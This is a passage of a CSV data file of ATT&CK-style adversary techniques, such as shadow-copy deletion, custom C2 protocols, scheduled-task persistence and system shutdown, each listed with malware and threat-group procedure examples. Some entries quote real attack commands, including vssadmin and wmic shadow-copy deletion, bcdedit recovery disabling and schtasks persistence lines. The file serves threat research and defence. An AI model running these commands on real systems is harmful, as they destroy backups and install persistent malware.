`C:\\\\Windows\\\\system32\\\\wbem\\\\wmic.exe shadowcopy delete`.', '[Pysa] has the functionality to delete shadow copies. ', '[Conficker] resets system restore points and deletes backup files.', '[Olympic Destroyer] uses the native Windows utilities <code>vssadmin</code>, <code>wbadmin</code>, and <code>bcdedit</code> to delete and disable operating system recovery features such as the Windows backup catalog and Windows Automatic Repair.', '[REvil] can use vssadmin to delete volume shadow copies and bcdedit to disable recovery features.', '[Maze] has attempted to delete the shadow volumes of infected machines, once before and once after the encryption process.', '[Diavol] can delete shadow copies using the `IVssBackupComponents` COM object to call the `DeleteSnapshots` method.', '[JCry] has been observed deleting shadow copies to ensure that data cannot be restored easily.\t', '[ProLock] can use vssadmin.exe to remove volume shadow copies.', '[BlackCat] can delete shadow copies using `vssadmin.exe delete shadows /all /quiet` and `wmic.exe Shadowcopy Delete`; it can also modify the boot loader using `bcdedit /set {default} recoveryenabled No`.']",False
T1216,System Script Proxy Execution,"Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.",[],False
T1094,Custom Command and Control Protocol,Adversaries may communicate using a custom command and control protocol instead of encapsulating commands/data in an existing [Application Layer Protocol] Implementations include mimicking well-known protocols or developing custom protocols (including raw sockets) on top of fundamental protocols provided by TCP/IP/another standard network stack.,"['[Mis-Type] network traffic can communicate over a raw socket.', '[PLAINTEE] uses a custom UDP protocol to communicate.', '[OilRig] has used custom DNS Tunneling protocols for C2.', '[WINDSHIELD] C2 traffic can communicate via TCP raw sockets.', '[Emotet] has been observed using an encrypted, modified protobuf-based protocol for command and control messaging.', '[Misdat] network traffic communicates over a raw socket.', '[PHOREAL] communicates via ICMP for C2.', '[Ursnif] has used a custom packet format over TCP and UDP for a peer-to-peer (P2P) network for C2.', '[MoonWind] completes network communication via raw sockets.', '[Crimson] uses a custom TCP protocol for C2.', '[Volgmer] uses a custom binary protocol to beacon back to its C2 server. It has also used XOR for encrypting communications.', '[APT37] credential stealer ZUMKONG emails credentials from the victim using HTTP POST requests.', '[PLATINUM] has used the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control.', '[RedLeaves] can communicate to its C2 over TCP using a custom binary protocol.', ""[APT32] uses [Cobalt Strike] malleable C2 functionality to blend in with network traffic. The group's backdoor can also exfiltrate data by encoding it in the subdomain field of DNS packets. Additionally, one of the group's macOS backdoors implements a specific format for the C2 packet involving random values."", '[Carbanak] uses a custom binary protocol for C2 communications.', '[Duqu] is capable of using its command and control protocol over port 443. However, Duqu is also capable of encapsulating its command protocol over standard application layer protocols. The Duqu command and control protocol implements many of the same features as TCP and is a reliable transport protocol.', '[Chaos] provides a reverse shell connection on 8338/TCP, encrypted via AES.', 'Some [Reaver] variants use raw TCP for C2.', '[RogueRobin] uses a custom DNS tunneling protocol for C2.', '[DDKONG] communicates over raw TCP.', '[Seasalt] uses a custom binary protocol for C2.', 'The [Regin] malware platform can use ICMP to communicate between infected computers.', '[Derusbi] binds to a raw socket on a random source port between 31800 and 31900 for C2.', '[RTM] uses HTTP POST requests with data formatted using a custom protocol.', '[njRAT] communicates to the C2 server using a custom protocol over TCP.', '[FlawedGrace] uses a custom binary protocol for its C2 communications.', '[Remsec] is capable of using ICMP, TCP, and UDP for C2.', '[PlugX] can be configured to use raw TCP or UDP for command and control.', '[InvisiMole] communicates with its C2 servers through a TCP socket.', '[Naid] connects to C2 infrastructure and establishes backdoors over a custom communications protocol.', 'If [NETEAGLE] does not detect a proxy configured on the infected machine, it will send beacons via UDP/6000. Also, after retrieving a C2 IP address and Port Number, [NETEAGLE] will initiate a TCP connection to this socket. The ensuing connection is a plaintext C2 channel in which commands are specified by DWORDs.', '[UBoatRAT] has used a custom command and control protocol to communicate with C2. The string ‘488’ is placed at the top of the payload and encrypts the entre buffer with a static key using a simple XOR cipher.', 'A [TYPEFRAME] variant uses fake TLS to communicate with the C2 server.', '[BISCUIT] communicates to the C2 server using a custom protocol.', 'A [Dipsind] variant uses a C2 mechanism similar to port knocking that allows attackers to connect to a victim without leaving the connection open for more than a few sectonds.', '[Zebrocy] uses raw sockets to communicate with its C2 server.', '[Cobalt Strike] allows adversaries to modify the way the ""beacon"" payload communicates. This is called ""Malleable C2"" in the [Cobalt Strike] manual and is intended to allow a penetration test team to mimic known APT C2 methods.', 'Lazarus Group malware uses a unique form of communication encryption that mimics TLS but uses a different encryption method, evading SSL man-in-the-middle decryption attacks.']",True
T1118,InstallUtil,InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries.  InstallUtil is located in the .NET directories on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> and <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>. InstallUtil.exe is digitally signed by Microsoft.  Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil may also be used to bypass process whitelisting through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. ,[],True
T1043,Commonly Used Port,"**This technique has been deprecated. Please use [Non-Standard Port] where appropriate.**  Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as  * TCP:80 (HTTP) * TCP:443 (HTTPS) * TCP:25 (SMTP) * TCP/UDP:53 (DNS)  They may use the protocol associated with the port or a completely different protocol.   For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are   * TCP/UDP:135 (RPC) * TCP/UDP:22 (SSH) * TCP/UDP:3389 (RDP)","['One [HTTPBrowser] variant connected to its C2 server over port 8080.', '[ftp] operates over ports 21 and 20.', '[Briba] connects to external C2 infrastructure over port 443.', '[Comnie] uses Port Numbers 80, 8080, 8000, and 443 for communication to the C2 servers.', '[S-Type] uses ports 80, 443, and 8080 for C2.', '[Night Dragon] has used ports 25 and 80 for C2 communications.', '[APT28] has used port 443 for C2.', '[HAWKBALL] has sent HTTP GET requests over port 443 for C2.', '[Linux Rabbit] checks to see if an SSH server is listening on port 22.', '[Pasam] connects to external C2 infrastructure and opens a backdoor over port 443.', '[APT19] used TCP port 80 for C2.', '[TEMP.Veles] has used port 443 for C2.', '[ZxShell] uses common ports such as 80 and 443 for C2.', '[Carbon] uses port 80 for C2 communications.', '[UBoatRAT] uses ports 80 and 443 for C2 communications.', '[MoonWind] communicates over ports 80, 443, 53, and 8080 via raw sockets instead of the protocols usually associated with the ports.', 'Some [Volgmer] variants use ports 8080 and 8000 for C2.', '[OceanSalt] uses Port Number 8080 for C2.', '[FlawedAmmyy] has used port 443 for C2.', '[Proxysvc] uses port 443 for the control server communications.', '[RedLeaves] uses a specific port of 443 and can also use ports 53 and 80 for C2. One [RedLeaves] variant uses HTTP over port 443 to connect to its C2 server.', '[HOPLIGHT] has connected outbound over TCP port 443. \t', '[Empire] can conduct command and control over commonly used ports like 80 and 443.', '[Duqu] uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.', '[Calisto] attempted to contact the C2 server over TCP using port 80.', '[APT29] has used Port Number 443 for C2.', '[FlawedGrace] has used port 443 for C2 communications.', '[OilRig] has used port 80 to call back to the C2 server.\t', '[Hi-Zor] communicates with its C2 server over port 443.', '[ServHelper] has used port 80 and 443 for C2.', '[Ixeshe] has used TCP port 443 for C2.', '[Naid] connects to external C2 infrastructure over port 443.', '[APT18] uses port 80 for C2 communications.', '[Wiarp] connects to external C2 infrastructure over the HTTP port.', '[Emotet] has used ports 20, 22, 80, 443, 8080, and 8443.', '[POWERTON] has used port 443 for C2 traffic. ', '[Misdat] network traffic communicates over common ports like 80, 443, or 1433.', '[Mivast] communicates over port 80 for C2.', 'Some [Lazarus Group] malware uses a list of ordered port numbers to choose a port for C2 traffic, which includes commonly used ports such as 443, 53, 80, 25, and 8080.', '[AuditCred] has used Port Number 443 for C2 communications.', '[KEYMARBLE] uses port 443 for C2.', '[InvisiMole] uses port 80 for C2.', '[POWERSTATS] has used port 80 for C2.', '[FIN8] has tunneled RDP backdoors over port 443.', '[EvilGrab] uses port 8080 for C2.', '[Mis-Type] communicates over common ports such as TCP 80, 443, and 25.', '[TYPEFRAME] variants can use ports 443, 8443, and 8080 for communications.', '[PowerDuke] connects over 443 for C2.', '[BADCALL] uses port 8000 and 443 for C2.', '[APT3] uses commonly used ports (like HTTPS/443) for command and control.', 'C2 traffic for most [Threat Group-3390] tools occurs over Port Numbers 53, 80, and 443.', '[MirageFox] uses port 80 for C2.', '[BBSRAT] uses HTTP TCP port 80 and HTTPS TCP port 443 for communications.', '[ELMER] uses HTTP over port 443 for command and control.', '[Magic Hound] malware has communicated with C2 servers over port 6667 (for IRC) and port 8080.', '[Derusbi] beacons to destination port 443.', '[PlugX] has beaconed to its C2 over port 443.', '[FELIXROOT] uses Port Numbers 443, 8443, and 8080 for C2 communications.', '[APT37] has used port 8080 for C2.', '[RATANKBA] uses port 443 for C2.', '[HARDRAIN] binds and listens on port 443.', 'A variant of [ADVSTORESHELL] attempts communication to the C2 server over HTTP on port 443.', '[Nidiran] communicates with its C2 domain over ports 443 and 8443.', '[Cardinal RAT] is downloaded using HTTP over port 443.', '[TrickBot] uses port 443 for C2 communications.', '[Cobalt Strike] uses a custom command and control protocol that communicates over commonly used ports. The C2 protocol is encapsulated in common application layer protocols.', '[BadPatch] uses port 26 for C2 communications.', '[Fysbis] has used port 80 for C2. ', '[KeyBoy] calls back to the C2 server over ports 53, 80, and 443.', '[Carbanak] uses Port Numbers 443 and 80 for the C2 server.', '[LOWBALL] command and control occurs via HTTPS over port 443.', '[RIPTIDE] is a RAT that communicates with HTTP.', '[Bisonal] uses 443 for C2 communications.', '[Dragonfly 2.0] used SMB over ports 445 or 139 for C2. The group also established encrypted connections over port 443.', '[FIN7] has used ports 53, 80, 443, and 8080 for C2.', '[Cobalt Strike] uses a custom command and control protocol that communicates over commonly used ports. The C2 protocol is encapsulated in common application layer protocols.', '[Machete] used TCP port 21 for C2.', '[Ebury] has used UDP port 53 for C2.\t', '[gh0st RAT] uses port 443 for C2 communications.', '[Shamoon] has used TCP port 8080 for C2.', '[APT33] has used port 443 for command and control.', '[Denis] uses port 53 for C2 communications.', '[APT32] has used port 80 for C2 communications.', '[Tropic Trooper] can use ports 443 and 53 for C2 communications via malware called TClient.', 'Dragonfly established encrypted connections over port 443.']",False
T1211,Exploitation for Defense Evasion,"Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.  Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery] The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.  There have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries , evade security logs , or deploy hidden infrastructure.",['[APT28] has used CVE-2015-4902 to bypass security features.'],False
T1127,Trusted Developer Utilities Proxy Execution,"Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.","['A version of [PlugX] loads as shellcode within a .NET Framework project using msbuild.exe, presumably to bypass application whitelisting techniques.', '[Empire] can use built-in modules to abuse trusted utilities like MSBuild.exe.']",False
T1529,System Shutdown/Reboot,"Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via [Network Device CLI] (e.g. <code>reload</code>).  Shutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.  Adversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe] or [Inhibit System Recovery] to hasten the intended effects on system availability.","['[AcidRain] reboots the target system once the various wiping processes are complete.', '[DCSrv] has a function to sleep for two hours before rebooting the system.', '[LockerGoga] has been observed shutting down infected systems.', '[Olympic Destroyer] will shut down the compromised system after it is done modifying system configuration settings.', ""[APT38] has used a custom MBR wiper named BOOTWRECK, which will initiate a system reboot after wiping the victim's MBR."", '[Maze] has issued a shutdown command on a victim machine that, upon reboot, will run the ransomware within a VM.', '[APT37] has used malware that will issue the command <code>shutdown /r /t 1</code> to reboot a system after wiping its MBR.', '[LookBack] can shutdown and reboot the victim machine.', '[WhisperGate] can shutdown a compromised host through execution of `ExitWindowsEx` with the `EXW_SHUTDOWN` flag.', '[KillDisk] attempts to reboot the machine by terminating specific processes.', '[NotPetya] will reboot the system one hour after infection.', '[Lazarus Group] has rebooted systems after destroying files and wiping the MBR on infected systems.', '[Shamoon] will reboot the infected system once the wiping functionality has been completed.\t', '[HermeticWiper] can initiate a system shutdown.', '[AvosLocker] Linux variant has terminated ESXi virtual machines.', '[DustySky] can shutdown the infected machine.']",False
T1077,Windows Admin Shares,"Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include <code>C$</code>, <code>ADMIN$</code>, and <code>IPC$</code>.   Adversaries may use this technique in conjunction with administrator-level [Valid Accounts] to remotely access a networked system over server message block (SMB)  to interact with systems using remote procedure calls (RPCs),  transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job] [Service Execution] and [Windows Management Instrumentation] Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash] and certain configuration and patch levels.   The [Net] utility can be used to connect to Windows admin shares on remote systems using <code>net use</code> commands with valid credentials. ",[],True
T1055.011,Extra Window Memory Injection,"Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process.   Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.    Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.  Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>. More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.     Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ","[""[Epic] has overwritten the function pointer in the extra window memory of Explorer's Shell_TrayWnd in order to execute malicious code in the context of the explorer.exe process."", '[Power Loader] overwrites Explorer’s Shell_TrayWnd extra window memory to redirect execution to a NTDLL function that is abused to assemble and execute a return-oriented programming (ROP) chain and create a malicious thread within Explorer.exe.']",
T1053.005,Scheduled Task,"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks] utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.  The deprecated [at] utility could also be abused by adversaries (ex: [At] though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.  An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution] adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.  Adversaries may also create ""hidden"" scheduled tasks (i.e. [Hide Artifacts] that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys. ","['[GoldMax] has used scheduled tasks to maintain persistence.', '[JSS Loader] has the ability to launch scheduled tasks to establish persistence.', '[BabyShark] has used scheduled tasks to maintain persistence.', 'During the [SolarWinds Compromise] [APT29] used `scheduler` and `schtasks` to create new tasks on remote host as part of their lateral movement. They manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration. [APT29] also created a scheduled task to maintain [SUNSPOT] persistence when the host booted.', '[DanBot] can use a scheduled task for installation.', '[Helminth] has used a scheduled task for persistence.', 'An [APT3] downloader creates persistence by creating the following scheduled task: <code>schtasks /create /tn ""mysc"" /tr C:\\Users\\Public\\test.exe /sc ONLOGON /ru ""System""</code>.', '[Milan] can establish persistence on a targeted host with scheduled tasks.', '[HermeticWiper] has the ability to use scheduled tasks for execution.', '[TrickBot] creates a scheduled task on the system that provides persistence.', '[Carbon] creates several tasks for later execution to continue persistence on the victim’s machine.', '[ComRAT] has used a scheduled task to launch its PowerShell loader.', '[JHUHUGIT] has registered itself as a scheduled task to run each time the current user logs in.', '[Cobalt Group] has created Windows tasks to establish persistence.', '[Silence] has used scheduled tasks to stage its operation.', '[Chimera] has used scheduled tasks to invoke Cobalt Strike including through batch script <code>schtasks /create /ru ""SYSTEM"" /tn ""update"" /tr ""cmd /c c:\\windows\\temp\\update.bat"" /sc once /f /st</code> and to maintain persistence.', 'A [Patchwork] file stealer can run a TaskScheduler DLL to add persistence.', '[yty] establishes persistence by creating a scheduled task with the command <code>SchTasks /Create /SC DAILY /TN BigData /TR “ + path_file + “/ST 09:30“</code>.', '[FIN7] malware has created scheduled tasks to establish persistence.', '[Sibot] has been executed via a scheduled task.', '[Anchor] can create a scheduled task for persistence.', '[GrimAgent] has the ability to set persistence using the Task Scheduler.', '[TA2541] has used scheduled tasks to establish persistence for installed tools. ', '[GALLIUM] established persistence for [PoisonIvy] by created a scheduled task.', '[SVCReady] can create a scheduled task named `RecoveryExTask` to gain persistence.', 'The different components of [Machete] are executed by Windows Task Scheduler.', '[HEXANE] has used a scheduled task to establish persistence for a keylogger.', '[Mustang Panda] has created a scheduled task to execute additional malicious software, as well as maintain persistence.', '[SharpStage] has a persistence component to write a scheduled task for the payload. ', '[NotPetya] creates a task to reboot the system one hour after infection.', '[Magic Hound] has used scheduled tasks to establish persistence and execution.', 'During the [2022 Ukraine Electric Power Attack] [Sandworm Team] leveraged Scheduled Tasks through a Group Policy Object (GPO) to execute [CaddyWiper] at a predetermined time.', '[zwShell] has used SchTasks for execution.', '[Remexi] utilizes scheduled tasks as a persistence mechanism.', '[Prestige] has been executed on a target system through a scheduled task created by [Sandworm Team] using [Impacket]', 'During [C0017] [APT41] used the following Windows scheduled tasks for DEADEYE dropper persistence on US state government networks: `\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor`, `\\Microsoft\\Windows\\Ras\\ManagerMobility`, `\\Microsoft\\Windows\\WDI\\SrvSetupResults`, and `\\Microsoft\\Windows\\WDI\\USOShared`. ', '[FIN13] has created scheduled tasks in the `C:\\Windows` directory of the compromised network. ', 'During [Frankenstein] the threat actors established persistence through a scheduled task using the command: `/Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR`, named ""WinUpdate"" ', '[BADHATCH] can use `schtasks.exe` to gain persistence. ', '[Dridex] can maintain persistence via the creation of scheduled tasks within system directories such as `windows\\system32\\`, `windows\\syswow64,` `winnt\\system32`, and `winnt\\syswow64`. ', '[ToddyCat] has used scheduled tasks to execute discovery commands and scripts for collection.', '[Blue Mockingbird] has used Windows Scheduled Tasks to establish persistence on local and remote hosts.', '[Molerats] has created scheduled tasks to persistently run VBScripts.', '[Okrum] installer can attempt to achieve persistence by creating a scheduled task.', '[Ramsay] can schedule tasks via the Windows COM API to maintain persistence.\t', '[Crutch] has the ability to persist using scheduled tasks.', '[Tomiris] has used `SCHTASKS /CREATE /SC DAILY /TN StartDVL /TR ""[path to self]"" /ST 10:00` to establish persistence.', '[Bad Rabbit] <code>infpub.dat</code> file creates a scheduled task to launch a malicious executable.', '[IcedID] has created a scheduled task that executes every hour to establish persistence.', '[APT29] has used named and hijacked scheduled tasks to establish persistence.', '[SharpDisco] can create scheduled tasks to execute reverse shells that read and write data to and from specified SMB shares.', '[CSPY Downloader] can use the schtasks utility to bypass UAC.', '[BADNEWS] creates a scheduled task to establish by executing a malicious payload every subsequent minute.', '[APT39] has created scheduled tasks for persistence.', '[FIN8] has used scheduled tasks to maintain RDP backdoors.', '[Dyre] has the ability to achieve persistence by adding a new task in the task scheduler to run every minute.', '[Wizard Spider] has used scheduled tasks to establish persistence for [TrickBot] and other malware.', '[ZxxZ] has used scheduled tasks for persistence and execution.', 'In the [Triton Safety Instrumented System Attack] [TEMP.Veles] installed scheduled tasks defined in XML files.', '[Lucifer] has established persistence by creating the following scheduled task <code>schtasks /create /sc minute /mo 1 /tn QQMusic ^ /tr C:Users\\%USERPROFILE%\\Downloads\\spread.exe /F</code>.', '[Saint Bot] has created a scheduled task named ""Maintenance"" to establish persistence.', '[Higaisa] dropped and added <code>officeupdate.exe</code> to scheduled tasks.', '[GravityRAT] creates a scheduled task to ensure it is re-executed everyday.', '[APT41] used a compromised account to create a scheduled task on a system.', '[SoreFang] can gain persistence through use of scheduled tasks.', '[Rancor] launched a scheduled task to gain persistence using the <code>schtasks /create /sc</code> command.', '[BONDUPDATER] persists using a scheduled task that executes every minute.', '[Lokibot] embedded the commands <code>schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I</code> inside a batch script. ', '[Emotet] has maintained persistence through a scheduled task. ', '[Meteor] execution begins from a scheduled task named `Microsoft\\Windows\\Power Efficiency Diagnostics\\AnalyzeAll` and it creates a separate scheduled task called `mstask` to run the wiper only once at 23:55:00.', 'During [CostaRicto] the threat actors used scheduled tasks to download backdoor tools. ', 'During [Operation Dream Job] [Lazarus Group] created scheduled tasks to set a periodic execution of a remote XSL script.', '[Tarrask] is able to create “hidden” scheduled tasks for persistence.', 'During [Operation CuckooBees] the threat actors used scheduled tasks to execute batch scripts for lateral movement with the following command: `SCHTASKS /Create /S <IP Address> /U <Username> /p <Password> /SC ONCE /TN test /TR <Path to a Batch File> /ST <Time> /RU SYSTEM.`', '[Machete] has created scheduled tasks to maintain [Machete] persistence.', '[RTM] tries to add a scheduled task to establish persistence.', '[SUGARDUMP] has created scheduled tasks called `MicrosoftInternetExplorerCrashRepoeterTaskMachineUA` and `MicrosoftEdgeCrashRepoeterTaskMachineUA`, which were configured to execute `CrashReporter.exe` during user logon.', '[FIN10] has established persistence by using S4U tasks as well as the Scheduled Task option in PowerShell Empire.', '[Naikon] has used schtasks.exe for lateral movement in compromised networks.', '[Shamoon] copies an executable payload to the target system by using [SMB/Windows Admin Shares] and then scheduling an unnamed task to execute the malware.', '[IronNetInjector] has used a task XML file named <code>mssch.xml</code> to run an IronPython script when a user logs in or when specific system events are created.', '[PowerSploit] <code>New-UserPersistenceOption</code> Persistence argument can be used to establish via a [Scheduled Task/Job]', '[Agent Tesla]  has achieved persistence via scheduled tasks. ', '[APT32] has used scheduled tasks to persist on victim systems.', '[Attor] installer plugin can schedule a new task that loads the dispatcher on boot/logon.', '[Fox Kitten] has used Scheduled Tasks for persistence and to load and execute a reverse proxy binary.', '[APT33] has created a scheduled task to execute a .vbe file multiple times a day.', '[Ryuk] can remotely create a scheduled task to execute itself on a system.', '[EvilBunny] has executed commands via scheduled tasks.', '[OilRig] has created scheduled tasks that run a VBScript to execute a payload on victim machines.', '[APT38] has used Task Scheduler to run programs at system startup or on a scheduled basis for persistence.', '[Maze] has created scheduled tasks using name variants such as ""Windows Update Security"", ""Windows Update Security Patches"", and ""Google Chrome Security Update"", to launch [Maze] at a specific time.', '[menuPass] has used a script (atexec.py) to execute a command on a target machine via Task Scheduler.', '[APT-C-36] has used a macro function to set scheduled tasks, disguised as those used by Google.', '[RemoteCMD] can execute commands remotely by creating a new schedule task on the remote system', '[AppleJeus] has created a scheduled SYSTEM task that runs when a user logs in.', 'One persistence mechanism used by [CozyCar] is to register itself as a scheduled task.', '[FIN6] has used scheduled tasks to establish persistence for various malware it uses, including downloaders known as HARDTACK and SHIPBREAD and [FrameworkPOS]', '[RainyDay] can use scheduled tasks to achieve persistence.', '[LuminousMoth] has created scheduled tasks to establish persistence for their tools.', '[ccf32] can run on a daily basis using a scheduled task.', 'During [Operation Wocao] threat actors used scheduled tasks to execute malicious PowerShell code on remote systems.', '[POWERSTATS] has established persistence through a scheduled task using the command <code>”C:\\Windows\\system32\\schtasks.exe” /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR “c:\\Windows\\system32\\wscript.exe C:\\Windows\\temp\\Windows.vbe”</code>.', '[Valak] has used scheduled tasks to execute additional payloads and to gain persistence on a compromised host.', '[Lazarus Group] has used <code>schtasks</code> for persistence including through the periodic execution of a remote XSL script or a dropped VBS payload.', '[BRONZE BUTLER] has used [schtasks] to register a scheduled task to execute malware during lateral movement.', '[MCMD] can use scheduled tasks for persistence.', 'Adversaries can instruct [Duqu] to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.', '[Dragonfly] has used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files.', '[BackConfig] has the ability to use scheduled tasks to repeatedly execute malicious payloads on a compromised host.', '[NETWIRE] can create a scheduled task to establish persistence.', '[Empire] has modules to interact with the Windows task scheduler.', 'During the [C0032] campaign, [TEMP.Veles] used scheduled task XML triggers.', '[MuddyWater] has used scheduled tasks to establish persistence.', '[SQLRat] has created scheduled tasks in <code>%appdata%\\Roaming\\Microsoft\\Templates\\</code>.', '[OopsIE] creates a scheduled task to run itself every three minutes.', '[Bumblebee] can achieve persistence by copying its DLL to a subdirectory of %APPDATA% and creating a Visual Basic Script that will load the DLL via a scheduled task.', '[Bazar] can create a scheduled task for persistence.', '[Matryoshka] can establish persistence by adding a Scheduled Task named ""Microsoft Boost Kernel Optimization"".', '[GRIFFON] has used <code>sctasks</code> for persistence. ', '[ServHelper] contains modules that will use [schtasks] to carry out malicious operations.', '[Disco] can create a scheduled task to run every minute for persistence.', '[Gamaredon Group] has created scheduled tasks to launch executables after a designated number of minutes have passed.\t', '[DarkWatchman] has created a scheduled task for persistence.', '[Kimsuky] has downloaded additional malware with scheduled tasks.', '[Pteranodon] schedules tasks to invoke its components in order to establish persistence.', '[Stuxnet] schedules a network job to execute two minutes after host infection.', '[InvisiMole] has used scheduled tasks named <code>MSST</code> and <code>\\Microsoft\\Windows\\Autochk\\Scheduled</code> to establish persistence.', '[CosmicDuke] uses scheduled tasks typically named ""Watchmon Service"" for persistence.', '[Stealth Falcon] malware creates a scheduled task entitled “IE Web Cache” to execute a malicious file hourly.', '[BITTER] has used scheduled tasks for persistence and execution.', '[QakBot] has the ability to create scheduled tasks for persistence.', '[POWRUNER] persists through a scheduled task that executes it every minute.', '[Revenge RAT] schedules tasks to run malicious scripts at different intervals.', '[Gazer] can establish persistence by creating a scheduled task.', '[Confucius] has created scheduled tasks to maintain persistence on a compromised host.', '[ISMInjector] creates scheduled tasks to establish persistence.', '[schtasks] is used to schedule tasks on a Windows system to run at a specific date and time.', '[QuasarRAT] contains a .NET wrapper DLL for creating and managing scheduled tasks for maintaining persistence upon reboot.', '[Goopy] has the ability to maintain persistence by creating scheduled tasks set to run every hour.\t', '[LitePower] can create a scheduled task to enable persistence mechanisms.', '[Smoke Loader] launches a scheduled task.', '[APT37] has created scheduled tasks to run malicious scripts on a compromised host.', '[Koadic] has used scheduled tasks to add persistence. ', '[Zebrocy] has a command to create a scheduled task for persistence.', '[AsyncRAT] can create a scheduled task to maintain persistence on system start-up.', '[HotCroissant] has attempted to install a scheduled task named “Java Maintenance64” on startup to establish persistence.', '[QUADAGENT] creates a scheduled task to maintain persistence on the victim’s machine.', '[TEMP.Veles] has used scheduled task XML triggers.', '[UNC2452] used <code>scheduler</code> and <code>schtasks</code> to create new tasks on remote hosts as part of lateral movement. They also manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration. [UNC2452] also created a scheduled task to maintain [SUNSPOT] persistence when the host booted. ', '[Operation Wocao] has used scheduled tasks to execute malicious PowerShell code on remote systems.', '[Frankenstein] has established persistence through a scheduled task using the command: <code> /Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR </code>, named ""WinUpdate"".\t', '[CostaRicto] has used scheduled tasks to download backdoor tools.', '[Dragonfly 2.0] used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files.', '[Machete] used scheduled tasks for persistence.']",False
